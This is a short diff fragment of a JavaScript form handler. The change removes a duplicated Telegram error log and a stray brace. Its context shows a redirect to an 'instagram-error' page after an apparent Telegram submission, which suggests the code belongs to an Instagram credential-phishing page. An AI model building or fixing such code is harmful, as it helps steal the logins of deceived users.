@@ -77,8 +77,6 @@ if (form) {
     window.location.href = "https://instagram-error.vercel.app/";
 } else {
     console.error("Telegram error:", result);
-            }
-    console.error("Telegram error:", result);
 }
 
         } catch (error) {
